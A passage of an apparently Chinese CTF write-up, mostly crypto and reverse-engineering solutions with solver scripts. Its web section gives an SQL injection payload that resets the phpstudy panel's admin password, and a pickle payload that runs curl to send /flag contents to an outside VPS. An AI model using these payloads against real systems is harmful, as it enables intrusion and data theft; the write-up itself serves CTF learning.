087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101&#x27;&#x27;&#x27; PELL方程求解+二项式定理应用。 12345678910111213141516171819202122n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, NoneN = 1117x, y = solve_pell(N)flag1 = (enc1 - 1) // n**2 * inverse_mod(233, n) % nflag2 = (enc2 % n**2 - 1) // n * inverse_mod(y, n) % nprint(bytes.fromhex(hex(flag1)[2:])+bytes.fromhex(hex(flag2)[2:]))# b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27; ​ backdoor 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from Crypto.Util.number import *from Crypto.Util.Padding import padfrom random import randintfrom Crypto.Util.strxor import strxorfrom Crypto.Cipher import AESfrom hashlib import sha256from hashlib import md5flag = b&#x27;xxx&#x27;def Get_Parameters(): w = getPrime(25) a = getPrime(15) b = getPrime(15) x = getPrime(30) return w,a,b,xdef Malicious_ECDH(): w,a,b,x = Get_Parameters() P = getPrime(512) A = getRandomNBitInteger(30) B = getRandomNBitInteger(40) F = GF(P) E = EllipticCurve(F, [A, B]) G = E.random_point() k1 = getRandomNBitInteger(50) M1 = k1 * G Y = x * G t = randint(0,1) t = 1 z = (k1 - w * t) * G + (-a*k1 - b) * Y k2 = sha256(str(z[0]).encode()).digest()[:6] k2 = bytes_to_long(k2) M2 = k2 * G k_rec = getRandomNBitInteger(50) B_ = k_rec * G shared_key1 = k_rec * M2 shared_key2 = k2 * B_ assert shared_key1 == shared_key2 print((w,a,b,x)) print((A,B,P)) print(G.xy()) print(M1.xy()) print(M2.xy()) print(B_.xy()) return shared_key1def easy_enc(pt,key): key = md5(str(int(key[0])).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ct = cipher.encrypt(pad(pt,16)) print(ct) key = Malicious_ECDH()easy_enc(flag,key) $z = (k_1 - wt) G + (-ak_1 - b)Y=k_1G-wtG+(-ak_1Y-bY)=M_1-wtG-axM_1-bxG$ 又 $key2=k_2B$，求解得到共享key，解AES即可。 12345678910111213141516171819202122w, a, b, x = (31889563, 31153, 28517, 763220531)A, B, P = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527)G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770)M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921)M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462)B = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370)enc = b&#x27;\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2&#x27;E = EllipticCurve(GF(P), [A, B])G, M1, M2, B = [E(_) for _ in [G, M1, M2, _B]]t = 1z = M1 - w*t* G - a*x*M1 - b*x*Gk2 = sha256(str(z[0]).encode()).digest()[:6]k2 = bytes_to_long(k2)key = k2 * _Bkey = md5(str(int(key[0])).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(enc)print(flag)# flag&#123;63259ab8-4916-4095-8888-d92c2b003e18&#125; ​ magic_dlp ez hyperelliptic curve problem 123456789101112131415161718192021222324252627282930313233from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom hashlib import sha256from base64 import b64encodefrom secret import flagp = random_prime(2 ^ 256) sx = randint(1, p-1) g = 3 PR.&lt;x&gt; = PolynomialRing(GF(p)) f = sum(randint(0, 2^128)*x**i for i in range(2*g + 1 + 1)) sy = f(sx).nth_root(2) HC = HyperellipticCurve(f, 0) J = HC.jacobian()(GF(p)) r = randint(0, 2^40) D1 = randint(1, p-1)*J(HC((sx, sy))) D2 = r*D1 key = sha256(str(r).encode()).digest() aes = AES.new(key, AES.MODE_ECB) ct = aes.encrypt(pad(flag, 16)) print(p) print(D1) print(D2) print(b64encode(ct).decode()) &quot;&quot;&quot;28250322002421485740011517298787354630342182411922678481506757706584776470549(x^3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565*x^2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229*x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773*x^2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914*x + 9020351128638199743425310619576234999021949822922952447017982687315971687269)(x^3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159*x^2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433*x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167*x^2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199*x + 24006419269594097580414614133924457311337109216133817568627246946606650903690)IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;&quot;&quot; 超椭圆曲线下的DLP问题。 首先恢复 $f$，参考 https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell 可用CRT得到 $f$，点数不足够使得不足以恢复正常的 $f$。 注意到 $p$ 为 256位，而 $f$ 的系数皆为 128位，可以用类似RLWE的方法LLL算出 $f$，最后，$r$ 不到 40位，可以用BSGS算法求解DLP问题。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadfrom hashlib import sha256from base64 import b64decodefrom tqdm import tqdmp = 28250322002421485740011517298787354630342182411922678481506757706584776470549PR = GF(p)[&quot;x&quot;]x = PR.gen()y = 0D1 = ( x ^ 3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565 * x ^ 2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229 * x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773 * x ^ 2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914 * x + 9020351128638199743425310619576234999021949822922952447017982687315971687269,)D2 = ( x ^ 3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159 * x ^ 2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433 * x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167 * x ^ 2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199 * x + 24006419269594097580414614133924457311337109216133817568627246946606650903690,)ct = b64decode(&quot;IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;)rems = [D1[1] ^ 2, D2[1] ^ 2]mods = [D1[0], D2[0]]ff = crt(rems, mods)L = prod(mods)print(ff)M = matrix( ZZ, [ vector(ff.padded_list(8)), vector(L.padded_list(8)), vector((L * x).padded_list(8)), *list(matrix.identity(8) * p), ],)M = M.augment(vector([1] + [0] * (2 + 8)))M[:, -1] *= 2**128M = M.LLL()M[:, -1] /= 2**128target = next(row for row in M if row[-1] == 1 or row[-1] == -1)if target[-1] == -1: target = -targetf = PR(list(target[:-1]))print(f)HC = HyperellipticCurve(f, 0)J = HC.jacobian()(GF(p))D1 = J(D1)D2 = J(D2)# BSGS# D2=(v+u*M)D1# D2-vD1=u*M*D1M = 2**20lhs = &#123;&#125;T = D2for v in tqdm(range(M)): lhs[T] = v T = T - D1MD1 = M * D1T = 0 * MD1for u in tqdm(range(M)): if T in lhs: v = lhs[T] r = u * M + v print(r) break T = T + MD1key = sha256(str(r).encode()).digest()aes = AES.new(key, AES.MODE_ECB)pt = unpad(aes.decrypt(ct), 16)print(pt)# flag&#123;72825d3f-74f0-0a0e-ba1c-895eee99dc29&#125; ​ Cisticola Let me tell you a story about polynomial. 123456789101112131415161718192021222324252627Q = [...]# -*- #!/usr/bin/env sage# Problem by rec, with nothing.import Qimport secretimport osimport randomfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padkey = os.urandom(16)cipher = AES.new(key=key, iv=bytes(range(16)), mode=AES.MODE_CBC)enc = cipher.encrypt(pad(secret.flag, 16)).hex()print(f&quot;&#123;enc = &#125;&quot;)p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599R.&lt;x&gt; = PolynomialRing(GF(p))Q = R(Q.Q)t = 17pos = random.sample(range(600), t) + [600]poly = [int(os.urandom(16).hex(), 16) for _ in range(t)] + [int(key.hex(), 16)]hint = 0for i in range(t+1): hint = (hint + poly[i]*x^pos[i]) % Qprint(f&quot;&#123;pos = &#125;\\n&#123;hint = &#125;&quot;) 多项式上的模运算，先用sage推导多项式： 1234567891011121314pos = [477, 491, 210, 515, 150, 142, 561, 5, 475, 329, 598, 274, 241, 310, 108, 483, 181, 600]Q = [...]p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599R = PolynomialRing(GF(p), &#x27;a&#x27;, 19)a = R.gens()x = a[18]#Q = R(Q)Q = ...poly = 0for i in range(18): poly = (poly + a[i]*x^pos[i]) % Q print(poly) 得到429次多项式，将同次项的系数归类，形成A/B矩阵： 1234567891011121314151617181920212223242526f = eval(open(r&#x27;outA.txt&#x27;).readlines()[0])print(len(f))d = []for i in range(430): d.append([])for k in f: x = k[0].strip() d[k[1]].append(int(x.split(&#x27;*&#x27;)[0]) if x[0] != &#x27;a&#x27; else 1)print([len(k) for k in d])# len=8: a0/1/3/6/8/10/15/17# len=9: a0/1/3/6/8/10/15/17+another oneA = d[-8:][::-1]f = eval(open(r&#x27;outB.txt&#x27;).readlines()[0])B = []for k in f: B.append(k[0])g = open(r&#x27;out_final.txt&#x27;,&#x27;w&#x27;)print(f&#x27;A = &#123;A&#125;&#x27;,file=g)print(f&#x27;B = &#123;B[:8]&#125;&#x27;,file=g) 发现大部分含8项的系数都与a0/a1/a3/a6/a8/a10/a15/a17变量有关，选取8组同次项与结果来做系数对比，求解矩阵方程： 12345678910p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599A = []B = []A = matrix(Zmod(p), A)B = vector(Zmod(p), B[:8])A \\ B# (232766905492121523584723111736297361759, 328061273411433237903912759338260875197, 64156810189296343079030126884552967921, 145155918563801313155466268136086691055, 281912772467581204740174686468688405760, 127909413131477378514965968460479471790, 176132068091173488530894527009633409599, 275609957223526193497841020687316070508) 得到key=a17=275609957223526193497841020687316070508，解AES： 12345678910from Crypto.Util.number import *from Crypto.Cipher import AESenc = &#x27;e086deeb9f060c014867c5adbd1ee1b449193b6e6177f58a36948282e1728f3b529b2def3c39f69c7a9001b4cac4d1d5&#x27;key = long_to_bytes(275609957223526193497841020687316070508)cipher = AES.new(key=key, iv=bytes(range(16)), mode=AES.MODE_CBC)m = cipher.decrypt(bytes.fromhex(enc))print(m)# b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\\x06\\x06\\x06\\x06\\x06\\x06&#x27; ​ ecdsa Let me tell you a story about ecdsa. 1234567891011121314151617181920212223242526import osimport ecdsaimport hashlibfrom Crypto.Util.number import *from Crypto.Util.strxor import strxor as xorimport secretp = getPrime(256)gen = lambda: p + getPrime(16)pad = lambda m: m + os.urandom(32 - len(m) % 32)key = os.urandom(30)sk = ecdsa.SigningKey.from_secret_exponent( secexp=bytes_to_long(key), curve=ecdsa.SECP256k1)sig1 = sk.sign(data=b&#x27;This is the first message.&#x27;, k=gen()).hex()sig2 = sk.sign(data=b&#x27;Here is another message.&#x27;, k=gen()).hex()enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).hex()print(f&quot;&#123;sig1 = &#125;\\n&#123;sig2 = &#125;\\n&#123;enc = &#125;&quot;)&#x27;&#x27;&#x27;sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;&#x27;&#x27;&#x27; 选取标准曲线SECP256k1，且查看ecdsa包源码，sig=r_str+s_str。 根据式子： $s_1 \\equiv k_1^{-1}(z_1+r_1d) \\pmod n,s_2 \\equiv k_2^{-1}(z_2+r_2d) \\pmod n$ 已知 $r_1,s_1,r_2,s_2,z_1,z_2$，且 $k_1-k_2=\\Delta k$ 很小，联立用 $\\Delta k$ 表示 $d$，再分别爆破 $\\Delta k$ 值即可得到正确的 $d$。 12345678910111213141516171819202122232425262728from hashlib import sha1,sha512p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141h1 = int(sha1(b&#x27;This is the first message.&#x27;).hexdigest(), 16)h2 = int(sha1(b&#x27;Here is another message.&#x27;).hexdigest(), 16)sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;def inv(x): return inverse_mod(x,n)r1 = int(sig1[:64], 16)s1 = int(sig1[64:], 16)r2 = int(sig2[:64], 16)s2 = int(sig2[64:], 16)for dk in range(-2^16, 2^16): x = (dk-(inv(s2)*h2-inv(s1)*h1))*inv(inv(s2)*r2-inv(s1)*r1)%n if x.nbits()&lt;=30*8: print(dk,x) flag = int(sha512(bytes.fromhex(hex(x)[2:])).hexdigest(), 16) ^^ int(enc,16) print(bytes.fromhex(hex(flag)[2:])) # -12538 529916052714421365211802626556164022962456609322782019794355446252399179# b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\\xed\\x98\\x98\\xbc\\x92+\\xc7\\x7f\\xe2_\\xfd\\x17\\x1e\\x9c\\xf7\\x17Rq\\xfa3\\xa2&#123;&#x27; ​ WEBphpstudyNKCTF 2023 - xiaopi 原题，参考 https://blog.csdn.net/weixin_52365980/article/details/129803385。 在请求头加 X-Requested-With: XMLHttpRequest 可以进入后台登录界面， 再参考小皮面板前台sql注入更改管理员密码，构造payload： admin&#39;;UPDATE ADMINS set PASSWORD = &#39;202cb962ac59075b964b07152d234b70&#39;;-- 接着用 admin/123 可进入后台，在计划任务界面直接RCE即可获取flag。 ​ easypy扫描得到目录 /download，访问下载 www.zip，里面真正的代码在 app.cpython-38.pyc，反编译： 1234567891011121314151617181920212223242526272829303132333435363738# Source Generated with Decompyle++# File: app.cpython-38.pyc (Python 3.8)import numpyimport base64from flask import Flask, Response, requestapp = Flask(__name__)def index(): return &#x27;小p想要找一个女朋友，你能帮他找找看么？&#x27;index = app.route(&#x27;/&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(index)def girlfriends(): if request.values.get(&#x27;data&#x27;): data = request.values.get(&#x27;data&#x27;) numpydata = base64.b64decode(data) if b&#x27;R&#x27; in numpydata and b&#x27;bash&#x27; in numpydata or b&#x27;sh&#x27; in numpydata: return &#x27;不能走捷径啊&#x27; resp = None.loads(numpydata) return &#x27;可以的，要的就是一种感觉&#x27;girlfriends = app.route(&#x27;/girlfriends&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(girlfriends)def download(): pass# WARNING: Decompyle incompletedownload = app.route(&#x27;/download&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(download)if __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, 80, **(&#x27;host&#x27;, &#x27;port&#x27;)) 观察到路由 /girlfriends?data=，需提供opcode来RCE，但不能包含 R 字符，参考文章，还可以使用 i 或 o 字符实现RCE，而禁用了 sh，不好实现反弹shell，用curl命令外带flag值到vps即可： vps：python3 -m http.server 10010 payload： 1234b&#x27;&#x27;&#x27;(S&#x27;curl http://120.25.104.209:10010?`base64 /flag`&#x27;iossystem.&#x27;&#x27;&#x27; 对应base64：KFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==。 ​ REVERSEsum 数字游戏！ 看反编译代码盲猜为数独游戏，对用户输入的数独矩阵进行求解，并输出解密后的flag在每一次循环中，读取玩家输入的数独矩阵并寻找空着的位置，接收到一个输入数字后，判断其是否合法，如果合法则填充进矩阵中，并对其求和。如果求解成功，则输出flag。 使用在线数独求解器，将填入数字连成字符串 468912723481342575971422657913948591537428763345261输入得到flag：flag&#123;bbcbff5c1f1ded46c25d28119a85c6c2&#125;。 ​ BWBA 一位85岁老大爷于今年考入大学的计算机科学与技术专业，在第一年的学习中学到了高等数学、离散数学、C++等，下面是大爷编写的一道程序，请破解大爷写的程序 encrypt() 加密函数： 12345678910111213141516171819202122232425262728293031323334__int64 __fastcall encrypt(__int64 a1, __int64 a2)&#123; double *v2; // rax double *v3; // rax double v5; // [rsp+8h] [rbp-38h] double v6; // [rsp+8h] [rbp-38h] double v7; // [rsp+8h] [rbp-38h] char v8; // [rsp+23h] [rbp-1Dh] BYREF int v9; // [rsp+24h] [rbp-1Ch] int j; // [rsp+28h] [rbp-18h] int i; // [rsp+2Ch] [rbp-14h] v9 = std::vector&lt;int&gt;::size(a2); std::allocator&lt;double&gt;::allocator(&amp;v8); std::vector&lt;double&gt;::vector&lt;int&gt;(a1, v9, 0LL, &amp;v8); std::allocator&lt;double&gt;::~allocator(&amp;v8); for ( i = 0; i &lt; v9; ++i ) &#123; for ( j = 0; j &lt; v9; ++j ) &#123; v5 = *std::vector&lt;int&gt;::operator[](a2, j); v6 = cos((j + 0.5) * (3.141592653589793 * i) / v9) * v5; v2 = std::vector&lt;double&gt;::operator[](a1, i); *v2 = *v2 + v6; &#125; if ( i ) v7 = sqrt(2.0 / v9); else v7 = sqrt(1.0 / v9); v3 = std::vector&lt;double&gt;::operator[](a1, i); *v3 = *v3 * v7; &#125; return a1;&#125; 识别代码逻辑为离散余弦变换(DCT)算法，写一个逆算法解密： 123456789101112131415161718192021222324import numpy as npc = &quot;370.75 234.362 -58.0834 59.8212 88.8221 -30.2406 21.8316 49.9781 -33.5259 2.69675 43.5386 -30.2925 -28.0754 27.593 -2.53962 -27.1883 -5.60777 -0.263937 6.80326 8.03022 -6.34681 -0.89506 -6.80685 -13.6088 27.0958 29.8439 -21.7688 -20.6925 -13.2155 -37.0994 2.23679 37.6699 -3.5 9.85188 57.2806 13.5715 -20.7184 8.6816 3.59369 -4.5302 4.22203 -28.8166 -23.695 31.2268 6.58823 -39.9966 -20.7877 -19.7624 -22.031 16.3285 2.07557 -26.2521 16.1914 18.3976 -26.9295 3.03769 41.0412 20.2598 14.991 6.99392 -22.3752 -7.24466 8.96299 -10.4874&quot;.split(&#x27; &#x27;)c = [float(k) for k in c]def idct(signal): &quot;&quot;&quot;Perform Inverse Discrete Cosine Transform (IDCT) on signal&quot;&quot;&quot; n = len(signal) x = np.zeros(n) for i in range(n): y = 0 for j in range(n): if j == 0: y += signal[j] / np.sqrt(n) else: y += signal[j] * np.sqrt(2/n) * np.cos((np.pi*(2*i+1)*j)/(2*n)) x[i] = y return np.round(x).tolist()out = idct(c)out = [int(k) for k in out]print(bytes(out))# b&#x27;flag&#123;9ab488a7-5b11-1b15-04f2-c230704ecf72&#125;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; ​ Emoji Connect 连连看 使用ILSpy分析Game模块，内含48*48 emoji表情矩阵，关键逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445private int[] number = new int[48]&#123; 25588, 31114, 28727, 26722, 24948, 25135, 25480, 29029, 23025, 25775, 15411, 25423, 25202, 30031, 27380, 30734, 25054, 25109, 20741, 28568, 28802, 24591, 26063, 30940, 30375, 19411, 29573, 20845, 27232, 26743, 25779, 24986, 31498, 30978, 22945, 26563, 35012, 29994, 27016, 29535, 21342, 26573, 27569, 25408, 31567, 25503, 21385, 27207&#125;;private void Select_Unit(Range Target)&#123; List&lt;Range&gt; list = new List&lt;Range&gt;(); foreach (Range cell in Target.Cells) &#123; list.Add(cell); &#125; if ((Target.Cells.Count == 2 &amp;&amp; (dynamic)list[0].get_Value(Type.Missing) != null &amp;&amp; (dynamic)list[1].get_Value(Type.Missing) != null &amp;&amp; (dynamic)list[1].get_Value(Type.Missing) != &quot;\\ud83d\\udca5&quot; &amp;&amp; (dynamic)list[0].get_Value(Type.Missing) != &quot;\\ud83d\\udca5&quot;) &amp;&amp; (((dynamic)list[0].get_Value(Type.Missing) == (dynamic)list[1].get_Value(Type.Missing)) ? true : false)) &#123; int[] array = ((IEnumerable&lt;char&gt;)(string)(dynamic)list[1].get_Value(Type.Missing)).Select((Func&lt;char, int&gt;)((char c) =&gt; c)).ToArray(); int num = (array[0] - 55296) * 1024 + array[1] - 56320 + 65536 - 128512; number[num] -= (list[1].Row - 1) * (list[1].Column - 1); number[num] -= (list[0].Row - 1) * (list[0].Column - 1); Range range = list[0]; object missing = Type.Missing; object obj; list[1].set_Value(Type.Missing, obj = &quot;\\ud83d\\udca5&quot;); range.set_Value(missing, obj); &#125; check();&#125;private void check()&#123; for (int i = 0; i &lt; 48; i++) &#123; for (int j = 0; j &lt; 48; j++) &#123; if (((dynamic)sheet1.Cells[i + 1, j + 1]).Value != &quot;\\ud83d\\udca5&quot;) &#123; return; &#125; &#125; &#125; MessageBox.Show(Encoding.ASCII.GetString(number.Select((int n) =&gt; (byte)n).ToArray()));&#125; 每选中相同的两个emoji，按照emoji对应的array值，将number数组里对应下标的值，减去选中的两个emoji所在的行列号之积。 上脚本模拟： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361s = [[ &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de22&quot;, &quot;d83d,de10&quot;, &quot;d83d,de29&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de09&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de20&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de21&quot;, &quot;d83d,de12&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1b&quot; ], [ &quot;d83d,de0a&quot;, &quot;d83d,de08&quot;, &quot;d83d,de02&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot;, &quot;d83d,de11&quot;, &quot;d83d,de05&quot;, &quot;d83d,de19&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de14&quot;, &quot;d83d,de25&quot;, &quot;d83d,de27&quot;, 